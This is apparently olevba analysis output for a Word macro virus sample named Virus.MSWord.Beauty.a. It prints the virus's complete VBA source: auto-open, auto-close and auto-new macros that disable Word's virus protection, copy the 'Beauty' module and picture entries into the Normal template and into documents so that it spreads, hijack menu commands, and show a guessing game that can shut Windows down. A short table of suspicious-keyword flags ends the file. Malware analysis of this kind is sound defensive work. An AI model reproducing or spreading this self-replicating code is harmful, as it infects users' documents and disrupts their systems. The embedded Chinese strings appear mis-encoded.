olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Beauty.a-22a7857b500161a46bc430f21156636693f3718f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Beauty.a-22a7857b500161a46bc430f21156636693f3718f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Beauty.bas 
in file: Virus.MSWord.Beauty.a-22a7857b500161a46bc430f21156636693f3718f - OLE stream: 'Macros/VBA/Beauty'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub autoclose()
Dim nor$
Dim fn$
Dim con
Dim c
Dim ca
Dim con1
Dim cc
Dim ca1
On Error Resume Next

Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
WordBasic.CurValues.FileSummaryInfo dlg
nor$ = dlg.Template
fn$ = WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 1)

con = WordBasic.CountAutoTextEntries(0)
If con > 0 Then
   For c = 1 To con
      If WordBasic.[AutoTextName$](c, 0) = "lamo" Then ca = 1
   Next c
End If
If ca <> 1 Then

 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="lamo", Tab:=1
 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="p1", Tab:=1
 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="p2", Tab:=1
 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="p4", Tab:=1

End If
con1 = WordBasic.CountAutoTextEntries(1)
If con1 > 0 Then
  For cc = 1 To con1
     If WordBasic.[AutoTextName$](cc, 1) = "lamo" Then ca1 = 1
  Next cc
End If
If ca1 <> 1 Then
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="lamo", Tab:=1
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="p1", Tab:=1
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="p2", Tab:=1
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="p4", Tab:=1
End If

On Error GoTo exit_
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone
    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False
    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate
    DocumentInstalled = False
    GlobalInstalled = False

    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "Beauty" Then
            DocumentInstalled = True
        End If
    Next

    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(j).Name = "Beauty" Then
            GlobalInstalled = True
        End If
    Next

    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Beauty", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
        
       
    End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Beauty", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
        
     

End If
Application.DisplayAlerts = wdAlertsAll

If WordBasic.Day(WordBasic.Now()) = WordBasic.Int(Rnd() * 30) + 1 Then
WordBasic.Call "game"
End If


exit_:
End Sub

Sub autoopen()
Dim nor$
Dim fn$
Dim con
Dim c
Dim ca
Dim con1
Dim cc
Dim ca1
On Error Resume Next
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
WordBasic.CurValues.FileSummaryInfo dlg
nor$ = dlg.Template
fn$ = WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 1)

con = WordBasic.CountAutoTextEntries(0)
If con > 0 Then
   For c = 1 To con
      If WordBasic.[AutoTextName$](c, 0) = "lamo" Then ca = 1
   Next c
End If
If ca <> 1 Then

 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="lamo", Tab:=1
 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="p1", Tab:=1
 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="p2", Tab:=1
 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="p4", Tab:=1

End If
con1 = WordBasic.CountAutoTextEntries(1)
If con1 > 0 Then
  For cc = 1 To con1
     If WordBasic.[AutoTextName$](cc, 1) = "lamo" Then ca1 = 1
  Next cc
End If
If ca1 <> 1 Then
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="lamo", Tab:=1
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="p1", Tab:=1
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="p2", Tab:=1
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="p4", Tab:=1
End If

On Error GoTo exit_
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone
    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False
    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate
    DocumentInstalled = False
    GlobalInstalled = False

    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "Beauty" Then
            DocumentInstalled = True
        End If
    Next

    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(j).Name = "Beauty" Then
            GlobalInstalled = True
        End If
    Next

    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Beauty", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
        
       
    End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Beauty", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
        
     

End If
Application.DisplayAlerts = wdAlertsAll

If WordBasic.Day(WordBasic.Now()) = WordBasic.Int(Rnd() * 30) + 1 Then
WordBasic.Call "game"
End If


exit_:

End Sub

Sub autonew()
Dim nor$
Dim fn$
Dim con
Dim c
Dim ca
Dim con1
Dim cc
Dim ca1
On Error Resume Next
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
WordBasic.CurValues.FileSummaryInfo dlg
nor$ = dlg.Template
fn$ = WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 1)

con = WordBasic.CountAutoTextEntries(0)
If con > 0 Then
   For c = 1 To con
      If WordBasic.[AutoTextName$](c, 0) = "lamo" Then ca = 1
   Next c
End If
If ca <> 1 Then

 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="lamo", Tab:=1
 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="p1", Tab:=1
 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="p2", Tab:=1
 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="p4", Tab:=1

End If
con1 = WordBasic.CountAutoTextEntries(1)
If con1 > 0 Then
  For cc = 1 To con1
     If WordBasic.[AutoTextName$](cc, 1) = "lamo" Then ca1 = 1
  Next cc
End If
If ca1 <> 1 Then
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="lamo", Tab:=1
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="p1", Tab:=1
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="p2", Tab:=1
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="p4", Tab:=1
End If

On Error GoTo exit_
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone
    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False
    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate
    DocumentInstalled = False
    GlobalInstalled = False

    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "Beauty" Then
            DocumentInstalled = True
        End If
    Next

    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(j).Name = "Beauty" Then
            GlobalInstalled = True
        End If
    Next

    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Beauty", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
        
       
    End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Beauty", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
        
     

End If
Application.DisplayAlerts = wdAlertsAll

If WordBasic.Day(WordBasic.Now()) = WordBasic.Int(Rnd() * 30) + 1 Then
WordBasic.Call "game"
End If


exit_:

End Sub

Sub GAME()
Dim R
Dim num
Dim ans
R = 1
WordBasic.BeginDialog 478, 216, "¬ь ¤k ®± for Word97"
    WordBasic.Picture 10, 6, 238, 199, "p4", 1, "Picture1"
    WordBasic.Text 266, 8, 194, 13, "¶Щ ! ЁЇ ­W ¤F ! ©M §Ъ Іq ­У ®±", "Text1"
    WordBasic.Text 266, 27, 193, 13, "»ґ ГP ¤@ ¤U §a !  Іq Д№ ґN Еэ ", "Text2"
    WordBasic.Text 266, 46, 184, 13, "§A ¬Э єл ±m Єє !! Іq їй ¤F !!", "Text3"
    WordBasic.Text 266, 65, 190, 13, "©с ¤Я !! µґ ¤Ј ·| °К §A Д_ ¶Q", "Text4"
    WordBasic.Text 266, 84, 190, 13, "Єє №q ёЈ ©M ёк ®Ж Єє !! ©с ¤Я", "Text5"
    WordBasic.Text 266, 103, 190, 13, "Є± §a !¤p ¤Я §O јQ »у ¦е іб !", "Text6"
    WordBasic.PushButton 268, 122, 195, 21, "Ёє§ЪҐX°Е¤M¦n¤F!!", "Push1"
    WordBasic.PushButton 268, 151, 195, 21, "Ёє§ЪҐXҐЫАY¦n¤F!!", "Push2"
    WordBasic.PushButton 268, 183, 195, 21, "Ёє§ЪҐXҐ¬¦n¤F!!", "Push3"
WordBasic.EndDialog

guessgame:
Dim gdh As Object: Set gdh = WordBasic.CurValues.UserDialog
num = WordBasic.Int(Rnd() * 5) + 1
ans = WordBasic.Dialog.UserDialog(gdh)
If num >= 4 Then
recall
GoTo guessgame

End If
If ans = num Then
WordBasic.MsgBox "Ґi  ґc !! іє  µM  ·|  їй  µ№  §A  іo  ­У  Їд  ¤p  ¤l!!", "¬ь ¤k ®± for Word97", 64
GoTo exit_
End If
WordBasic.Beep
WordBasic.MsgBox "»№  АЕ  ¤F !! Ґs  Бn  ©h  Ґ¤  Ґ¤ , ¦Т  ј{  Еэ  §A  ¤@  §в !!", "¬ь ¤k ®± for Word97", 64
R = R + 1
If R <= 5 Then
GoTo guessgame
End If

WordBasic.MsgBox "ЁS  ЁЈ  №L  №і  §A  іo  јЛ  ЪД  Єє  ¤H  !!  ¤p  ©j  §Ъ  ¤Ј  і­  §A  ЇУ  ¤F !!", "¬ь ¤k ®± for Word97", 64
WordBasic.ExitWindows

exit_:
guess1
End Sub

Private Sub guess1()
Dim R
Dim num
Dim ans
R = 1
WordBasic.BeginDialog 478, 216, "¬ь ¤k ®± for Word97 "
    WordBasic.Picture 10, 6, 238, 199, "lamo", 1, "Picture1"
    WordBasic.Text 266, 8, 194, 13, "­у!¦A©M§ЪІq­У®±§a!", "Text1"
    WordBasic.Text 266, 27, 193, 13, "¬Э§A¦n№BЁмґX®Й?ІqД№¤F!", "Text2"
    WordBasic.Text 266, 46, 184, 13, "ґNЕэ§A¬Э§уєл±mЄє!!Іqїй¤F!!", "Text3"
    WordBasic.Text 266, 65, 190, 13, "©с¤Я!!µґ¤Ј·|¶Л®`§AД_¶Q", "Text4"
    WordBasic.Text 266, 84, 190, 13, "Єє№qёЈ©Mёк®ЖЄє!!©с¤Я", "Text5"
    WordBasic.Text 266, 103, 190, 13, "Є±§a!°O±o§в»у¦еАї°®Іbіб!", "Text6"
    WordBasic.PushButton 268, 122, 195, 21, "Ёє§ЪҐX°Е¤M¦n¤F!!", "Push1"
    WordBasic.PushButton 268, 151, 195, 21, "Ёє§ЪҐXҐЫАY¦n¤F!!", "Push2"
    WordBasic.PushButton 268, 183, 195, 21, "Ёє§ЪҐXҐ¬¦n¤F!!", "Push3"
WordBasic.EndDialog

guessgame:
Dim gdh As Object: Set gdh = WordBasic.CurValues.UserDialog
num = WordBasic.Int(Rnd() * 5) + 1
ans = WordBasic.Dialog.UserDialog(gdh)
If num >= 5 Then
recall
GoTo guessgame

End If

If ans = num Then
WordBasic.MsgBox "®р  ¦є  ¤H  ¤F !! §A  Єє  №B  ®р  «з  »т  іo  »т  ¦n  ?", "¬ь ¤k ®± for Word97", 64
GoTo exit_
End If
WordBasic.Beep
WordBasic.MsgBox "¦^  Ґh  ¦Y  Ґ¤  §a !! ЁЕ  Їд  Ґј  °®  Єє  ¤p  ¤l !!", "¬ь ¤k ®± for Word97", 64
R = R + 1
If R <= 5 Then
GoTo guessgame
End If

WordBasic.MsgBox "¤С  ¦r  ІД  ¤@  ё№  ¤j  ҐХ  ГЁ !!!! №L  ЁУ  »Q  §Ъ  Єє  ё}  іk  АY  §a !!", "¬ь ¤k ®± for Word97", 64
WordBasic.ExitWindows


exit_:
guess2
End Sub

Private Sub guess2()
Dim R
Dim num
Dim ans
R = 1
WordBasic.BeginDialog 478, 216, "¬ь ¤k ®± for Word97"
    WordBasic.Picture 10, 6, 238, 199, "p1", 1, "Picture1"
    WordBasic.Text 266, 8, 194, 13, "¤ЈВІіж!іsВфЁвГц!іo¦^­nЕэ§A", "Text1"
    WordBasic.Text 266, 27, 193, 13, "¦Y¤Ј§№°ВµЫЁ«!§A¦ж¶Ь???", "Text2"
    WordBasic.Text 266, 46, 184, 13, "§AД№ЄєёЬ!БЩ¦і§уєл±mЄє", "Text3"
    WordBasic.Text 266, 65, 190, 13, "ґ|ґ|Іґ·ъ§OАьµЫ¤@№п¦єіЅІґ!", "Text4"
    WordBasic.Text 266, 84, 190, 13, "§в±ѕ¦bјLЁ¤Єє¤f¤фАї°®§a!!", "Text5"
    WordBasic.Text 266, 103, 190, 13, "§OёЛҐX¤@°Ж¤jҐХГЁЄєјТјЛ!", "Text6"
    WordBasic.PushButton 268, 122, 195, 21, "Ёє§ЪҐX°Е¤M¦n¤F!!", "Push1"
    WordBasic.PushButton 268, 151, 195, 21, "Ёє§ЪҐXҐЫАY¦n¤F!!", "Push2"
    WordBasic.PushButton 268, 183, 195, 21, "Ёє§ЪҐXҐ¬¦n¤F!!", "Push3"
WordBasic.EndDialog

guessgame:
Dim gdh As Object: Set gdh = WordBasic.CurValues.UserDialog
num = WordBasic.Int(Rnd() * 15) + 1
ans = WordBasic.Dialog.UserDialog(gdh)
If num >= 8 Then
recall
GoTo guessgame

End If

If ans = num Then
WordBasic.MsgBox "іЮ !! §A  ¦і  §@  №ъ  Єє  ¶ы  єГ  іб !!", "¬ь ¤k ®± for Word97", 64
GoTo exit_
End If
WordBasic.Beep
WordBasic.MsgBox "іЮ !! §A  ¦b  єО  Д±  Ј« ????", "¬ь ¤k ®± for Word97", 64
R = R + 1
If R <= 5 Then
GoTo guessgame
End If

WordBasic.MsgBox "До  Ѕј  Б°  ·Q  ¦Y  ¤С  ГZ  ¦Ч  !! БЩ  ¦­  µЫ  ©O  !! ¤@  Гд  ІD  §Ц  Ґh !!", "¬ь ¤k ®± for Word97", 64
WordBasic.ExitWindows

exit_:
guess3
End Sub

Private Sub guess3()
Dim num
Dim ans
WordBasic.BeginDialog 478, 216, "¬ь ¤k ®± for Word97"
    WordBasic.Picture 10, 6, 238, 199, "p2", 1, "Picture1"
    WordBasic.Text 266, 8, 194, 13, "¶Щ!¤@ёф№LГц±Щ±N!ЁЇ­W¤F! ", "Text1"
    WordBasic.Text 266, 27, 193, 13, "»ґГP¤@¤U!", "Text2"
    WordBasic.Text 266, 46, 184, 13, "·ЗіЖ¬Эєл±mЄє§a!!", "Text3"
    WordBasic.Text 266, 65, 190, 13, "©с¤Я!!µґ¤Ј·|°К§AД_¶Q", "Text4"
    WordBasic.Text 266, 84, 190, 13, "Єє№qёЈ©Mёк®ЖЄє!!©с¤Я¬Э§a!", "Text5"
    WordBasic.Text 266, 103, 190, 13, "¤p¤Я§O§в»у¦ејQ±oЁміBіЈ¬O!", "Text6"
    WordBasic.PushButton 268, 122, 195, 21, "Ёє§ЪҐX°Е¤M¦n¤F!!", "Push1"
    WordBasic.PushButton 268, 151, 195, 21, "Ёє§ЪҐXҐЫАY¦n¤F!!", "Push2"
    WordBasic.PushButton 268, 183, 195, 21, "Ёє§ЪҐXҐ¬¦n¤F!!", "Push3"
WordBasic.EndDialog

guessgame:
Dim gdh As Object: Set gdh = WordBasic.CurValues.UserDialog
num = WordBasic.Int(Rnd() * 10) + 1
ans = WordBasic.Dialog.UserDialog(gdh)
If num >= 6 Then
recall
GoTo guessgame

End If

If ans = num Then
WordBasic.MsgBox "°Q  №Ѕ  °Х  !! ­и  ¤~  Ёє  ¤@  ®±  ¤Ј  єв  °Х  !!", "¬ь ¤k ®± for Word97", 64
GoTo exit_
End If
WordBasic.Beep
WordBasic.MsgBox "Ј° !! §Ъ  Д№  ¤F !! ¦n  ґО  іб  !! іo  Ґs  №к  ¤O  !! Аґ  ¤Ј  Аґ  Ј«??", "¬ь ¤k ®± for Word97", 64
GoTo guessgame



exit_:
WordBasic.FileNewDefault
WordBasic.CenterPara
WordBasic.FormatFont Points:=64, Underline:=1, Color:=6, Bold:=1
WordBasic.Insert "§ЪµoІ{¤@ °¦¤jЅЮ­ф¤F­C !! ¦b­юёМ....?¦b­юёМ.......? ¤ЈґNҐї¦b№qёЈїГ№х«e¶Ь??"
WordBasic.DocClose 1
WordBasic.ExitWindows

End Sub

Private Sub recall()
WordBasic.Beep
WordBasic.MsgBox "·d  ¤°  »т  №А ! іє  µM  Ґ­  ¤в ! ¦A  Іq  ¤@  ®±  §a !! ", "¬ь ¤k ®± for Word97", 64

End Sub
Sub FileTemplates()
Dim k
'1997.09.08 by gdh
k = WordBasic.Int(Rnd() * 10)
If k >= 8 Then
WordBasic.Call "game"
GoTo bye
End If

exit_:
WordBasic.Beep
WordBasic.MsgBox " °O ѕР Ей ҐО §№ ", "Microsoft Visual Basic", 48

bye:

End Sub
Sub ToolsMacro()
Dim k
'1997.09.08 by gdh
k = WordBasic.Int(Rnd() * 10)
If k >= 8 Then
WordBasic.Call "game"
GoTo bye
End If

exit_:
WordBasic.Beep
WordBasic.MsgBox " °O ѕР Ей ҐО §№ ", "Microsoft Visual Basic", 48

bye:

End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|AutoExec  |autonew             |Runs when a new Word document is created     |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

